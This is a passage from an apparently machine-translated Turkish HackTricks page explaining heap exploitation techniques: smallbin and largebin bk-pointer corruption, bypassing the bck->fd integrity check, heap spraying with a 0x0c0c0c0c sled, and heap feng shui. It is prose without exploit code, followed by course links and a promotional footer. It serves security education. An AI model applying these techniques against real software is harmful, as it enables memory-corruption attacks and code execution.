Amacımız şudur: Eğer bir heap'e taşma yapabilirsek ve altında serbest bırakılmış ve binine yerleştirilmiş bir parça varsa, bk işaretçisini değiştirebiliriz. Bk işaretçisini değiştirirsek ve bu parça binin listenin ilk parçası haline gelirse ve ayrıldığında, bin yanıltılacak ve bir sonraki parçanın (sunulan) yanlış adreste olduğuna inanacak (örneğin stack veya GOT'a). Bu durumda başka bir parça ayrıldığında ve saldırganın izinleri varsa, istenen konumda bir parça alacak ve içine yazabilecektir.

Değiştirilen parçanın serbest bırakıldıktan sonra serbest bırakılan parçadan daha büyük bir parça ayrılmalı, böylece değiştirilen parça sıralanmamış binlerden çıkar ve binine yerleştirilir.

Binine yerleştirildikten sonra, taşma yaparak bk işaretçisini değiştirmek için zamanı gelir, böylece bin, malloc() yeterince çağrıldığında değiştirilmiş bin'i tekrar kullanır ve bir sonraki parçanın yanlış adreste olduğuna inanır. Ve ardından istenen parça verilir.

Bu zafiyetin mümkün olan en kısa sürede gerçekleşmesi için ideal olan şudur: Zafiyetli parçanın ayrılması, değiştirilecek parçanın ayrılması, bu parçanın serbest bırakılması, değiştirilecek parçadan daha büyük bir parça ayrılması, parça değiştirilir (zafiyet), zafiyetli parçadan aynı boyutta bir parça ayrılması ve zafiyetli parçadan aynı boyutta ikinci bir parça ayrılması ve bu parça seçilen adrese işaret edecek şekilde olmalıdır.

Bu saldırıyı korumak için, tipik olarak "yanlış" parçanın kontrolü yapılır: bck->fd'nin victim'a işaret etmediği kontrol edilir. Yani, bizim durumumuzda, stack'te işaret edilen yanlış parçanın fd\* işaretçisinin victim'a işaret edip etmediği kontrol edilir. Bu korumayı aşmak için saldırganın, uygun şekilde (muhtemelen stack üzerinden) victim'ın adresini yazabilmesi gerekir. Böylece gerçek bir parça gibi görünür.

**LargeBin Bozulması**

Önceki gereksinimlerin yanı sıra, ayrılan parçaların 512'den büyük olması gerekir.

Saldırı, öncekiyle aynıdır, yani bk işaretçisini değiştirmek gereklidir ve tüm bu malloc() çağrılarına ihtiyaç vardır, ancak değiştirilen parçanın boyutunu değiştirmek gereklidir, böylece bu boyut - nb < MINSIZE olmalıdır.

Örneğin, boyutu 1552 olarak ayarlamak, 1552 - 1544 = 8 < MINSIZE olacak şekilde yapılmalıdır (çıkarma negatif olmamalı çünkü unsigned karşılaştırılır).

Ayrıca, daha da karmaşık hale getirmek için bir yama eklenmiştir.

**Heap Spreyi**

Temelde, mümkün olan tüm belleği heap'ler için ayırmak ve bunları noplardan oluşan bir shellcode ile doldurmaktır. Ayrıca, bir yastık olarak 0x0c kullanılır. Yani 0x0c0c0c0c adresine atlamaya çalışılacak ve böylece bu yastıkla çağrılacak bir adres üzerine yazılırsa oraya atlayacaktır. Temel olarak taktik, birçok şeyi ayırmak ve bir noktaya atlamak için 0x0c0c0c0c adresine atlamayı ummaktır.

**Heap Feng Shui**

Belleği parçalar arasında serbest bırakılmış parçaların kaldığı şekilde sementlemek için rezervasyonlar ve serbest bırakmalar kullanmaktır. Taşmayı yapılacak tampon bir yumurtanın içine yerleştirilir.

## İlginç Kurslar

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referanslar**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı HackTricks ve HackTricks Cloud github depolarına PR göndererek paylaşın.**

</details>
